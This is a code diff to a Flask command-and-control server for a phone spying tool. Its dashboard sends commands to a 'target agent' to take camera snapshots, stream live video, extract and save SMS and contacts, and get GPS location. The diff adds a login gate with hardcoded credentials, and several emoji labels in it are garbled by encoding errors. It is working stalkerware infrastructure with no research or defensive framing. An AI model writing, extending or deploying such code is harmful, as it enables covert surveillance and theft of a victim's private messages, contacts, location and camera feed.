@@ -1,10 +1,11 @@
-
-from flask import Flask, request, render_template_string, jsonify, send_from_directory
+from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
 import os
 import base64
-from datetime import datetime
+from datetime import datetime, timedelta
 
 app = Flask(__name__)
+# Secure secret key for session management
+app.secret_key = os.urandom(24)
 
 # Folder Structure: mission/captures
 MISSION_FOLDER = 'mission'
@@ -18,6 +19,106 @@ current_param = ""
 latest_result = "SYSTEM INITIALIZED... WAITING FOR TARGET AGENT CONNECTION."
 latest_image = ""
 latest_live_data = ""
+
+# Security Configuration for 2026 Advanced Guard
+ADMIN_USER = "poonam"
+ADMIN_PASS = "radhe@123" # Aap ise apne hisaab se badal sakte hain
+MAX_ATTEMPTS = 3
+LOCKOUT_TIME_MINUTES = 5
+
+# Track login attempts globally for simplicity (or use DB/cache in production)
+login_attempts = 0
+lockout_timer = None
+
+LOGIN_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE ACCESS // NOC MISSION COMMAND</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
+        body {
+            background-color: #000205;
+            color: #00ffcc;
+            font-family: 'Share Tech Mono', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-card {
+            background: linear-gradient(135deg, #050b14 0%, #000205 100%);
+            border: 1px solid #1e293b;
+            border-top: 4px solid #00ffcc;
+            border-radius: 8px;
+            padding: 30px;
+            width: 350px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.9);
+            text-align: center;
+        }
+        h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            color: #00ffcc;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 15px rgba(0,255,204,0.6);
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #000103;
+            border: 1px solid #334155;
+            color: #00ffcc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        button {
+            background-color: #020617;
+            color: #00ffcc;
+            border: 1px solid #00ffcc;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            font-family: 'Share Tech Mono', monospace;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+        }
+        button:hover {
+            background-color: #00ffcc;
+            color: #000205;
+            box-shadow: 0 0 20px #00ffcc;
+        }
+        .error {
+            color: #ef4444;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <h2>ðŸ”’ RADHA KRISHANA SYSTEM </h2>
+        <form method="POST">
+            <input type="text" name="username" placeholder="Agent ID / Username" required autocomplete="off">
+            <input type="password" name="password" placeholder="Access Passcode" required>
+            <button type="submit">AUTHENTICATE</button>
+        </form>
+        {% if error %}
+            <div class="error">{{ error }}</div>
+        {% endif %}
+    </div>
+</body>
+</html>
+"""
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -48,6 +149,12 @@ HTML_TEMPLATE = """
             max-width: 1400px;
             margin: 0 auto;
         }
+        .top-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
         .status-bar {
             text-align: center;
             font-size: 14px;
@@ -55,10 +162,30 @@ HTML_TEMPLATE = """
             border: 1px solid #059669;
             padding: 10px;
             background: rgba(5, 150, 105, 0.1);
-            margin-bottom: 20px;
             border-radius: 6px;
             box-shadow: 0 0 25px rgba(74,222,128,0.3);
             letter-spacing: 3px;
+            flex-grow: 1;
+            margin-right: 15px;
+        }
+        .logout-btn {
+            background-color: #020617;
+            color: #ef4444;
+            border: 1px solid #ef4444;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: 'Share Tech Mono', monospace;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            display: inline-block;
+        }
+        .logout-btn:hover {
+            background-color: #ef4444;
+            color: #000205;
+            box-shadow: 0 0 25px #ef4444;
         }
         .grid {
             display: grid;
@@ -191,31 +318,35 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="container">
-        <h2>⚡ NOC MISSION COMMAND // CYBER-OPS 2026 ⚡</h2>
-        <div class="status-bar">[ MISSION FOLDER ACTIVE // AUTO-LOGGING INTEL & SNAPSHOTS ]</div>
+        <h2>âš¡ NOC MISSION COMMAND // CYBER-OPS 2026 âš¡</h2>
+        
+        <div class="top-nav">
+            <div class="status-bar">[ MISSION FOLDER ACTIVE // SECURE SESSION LOCKED ]</div>
+            <a href="/logout" class="logout-btn">TERMINATE SESSION</a>
+        </div>
 
         <div class="grid">
             <div class="panel">
-                <h4>📸 MANUAL SNAPSHOTS</h4>
+                <h4>ðŸ“¸ MANUAL SNAPSHOTS</h4>
                 <button onclick="sendCommand('task_front_camera')">FRONT SNAPSHOT (HD)</button>
                 <button onclick="sendCommand('task_back_camera')">REAR SNAPSHOT (HD)</button>
             </div>
 
             <div class="panel">
-                <h4>🔴 TACTICAL LIVE STREAM</h4>
+                <h4>ðŸ”´ TACTICAL LIVE STREAM</h4>
                 <button onclick="sendCommand('task_live_front')">START FRONT LIVE</button>
                 <button onclick="sendCommand('task_live_back')">START REAR LIVE</button>
                 <button class="stop" onclick="sendCommand('task_stop_live')">STOP LIVE STREAM</button>
             </div>
 
             <div class="panel">
-                <h4>📂 TARGET INTEL EXTRACT</h4>
+                <h4>ðŸ“‚ TARGET INTEL EXTRACT</h4>
                 <button class="intel" onclick="sendCommand('task_get_sms')">EXTRACT &amp; SAVE SMS</button>
                 <button class="intel" onclick="sendCommand('task_get_contacts')">EXTRACT &amp; SAVE CONTACTS</button>
             </div>
 
             <div class="panel">
-                <h4>📍 TELEMETRY & AUDIO</h4>
+                <h4>ðŸ“� TELEMETRY & AUDIO</h4>
                 <button onclick="sendCommand('location_info')">ACQUIRE GPS FIX</button>
                 <input type="text" id="tts_txt" value="System Security Alert">
                 <button onclick="sendParam('task_speak_toast', document.getElementById('tts_txt').value)">SPEAK &amp; SHOW TOAST</button>
@@ -224,11 +355,11 @@ HTML_TEMPLATE = """
 
         <div class="main-display">
             <div>
-                <div class="section-title">📥 TARGET TELEMETRY LOGS</div>
+                <div class="section-title">ðŸ“¥ TARGET TELEMETRY LOGS</div>
                 <div class="console-box" id="consoleBox">Awaiting incoming telemetry feed...</div>
             </div>
             <div>
-                <div class="section-title">👁️ TACTICAL SURVEILLANCE VIEWER (HD)</div>
+                <div class="section-title">ðŸ‘�ï¸� TACTICAL SURVEILLANCE VIEWER (HD)</div>
                 <div class="viewer-box" id="imgViewer">
                     <span style="color: #475569; font-size: 14px; letter-spacing: 2px;">[ WAITING FOR LIVE FEED / SNAPSHOT ]</span>
                 </div>
@@ -259,12 +390,50 @@ HTML_TEMPLATE = """
 </html>
 """
 
-@app.route('/')
+@app.route('/', methods=['GET', 'POST'])
 def home():
-    return render_template_string(HTML_TEMPLATE)
+    global login_attempts, lockout_timer
+
+    # Check if user is already authenticated in the current session
+    if session.get('authenticated'):
+        return render_template_string(HTML_TEMPLATE)
+
+    # Check if currently locked out
+    if lockout_timer and datetime.now() < lockout_timer:
+        remaining = int((lockout_timer - datetime.now()).total_seconds())
+        return render_template_string(LOGIN_TEMPLATE, error=f"SYSTEM LOCKED: Too many failed attempts. Try again in {remaining}s.")
+
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+
+        if username == ADMIN_USER and password == ADMIN_PASS:
+            # Reset attempts on successful login
+            login_attempts = 0
+            lockout_timer = None
+            session['authenticated'] = True
+            return redirect(url_for('home'))
+        else:
+            login_attempts += 1
+            if login_attempts >= MAX_ATTEMPTS:
+                lockout_timer = datetime.now() + timedelta(minutes=LOCKOUT_TIME_MINUTES)
+                login_attempts = 0
+                return render_template_string(LOGIN_TEMPLATE, error=f"MAX ATTEMPTS REACHED. System locked for {LOCKOUT_TIME_MINUTES} minutes.")
+            
+            remaining_tries = MAX_ATTEMPTS - login_attempts
+            return render_template_string(LOGIN_TEMPLATE, error=f"ACCESS DENIED. Invalid Credentials. {remaining_tries} attempts remaining.")
+
+    return render_template_string(LOGIN_TEMPLATE)
+
+@app.route('/logout')
+def logout():
+    session.pop('authenticated', None)
+    return redirect(url_for('home'))
 
 @app.route('/get_action', methods=['GET'])
 def get_action():
+    if not session.get('authenticated'):
+        return jsonify({"error": "Unauthorized"}), 401
     global current_action, current_param
     res = '{"action":"' + current_action + '","param":"' + current_param + '"}'
     current_action = "none"
@@ -277,7 +446,6 @@ def post_result():
     result = request.form.get('result', 'No Data')
     latest_result = result
 
-    # Auto-save intel data to .txt files inside 'mission/' folder
     timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
     if "LATEST SMS INBOX" in result:
         txt_path = os.path.join(MISSION_FOLDER, f"sms_intel_{timestamp_str}.txt")
@@ -295,6 +463,8 @@ def post_result():
 
 @app.route('/get_result', methods=['GET'])
 def get_result():
+    if not session.get('authenticated'):
+        return "Unauthorized", 401
     global latest_result
     return latest_result, 200
 
@@ -334,11 +504,15 @@ def upload_live_frame():
 
 @app.route('/get_live_frame', methods=['GET'])
 def get_live_frame():
+    if not session.get('authenticated'):
+        return jsonify({"error": "Unauthorized"}), 401
     global latest_live_data
     return jsonify({"image": latest_live_data}), 200
 
 @app.route('/set_action', methods=['GET'])
 def set_action():
+    if not session.get('authenticated'):
+        return "Unauthorized", 401
     global current_action, current_param
     current_action = request.args.get('action', 'none')
     current_param = request.args.get('param', '')
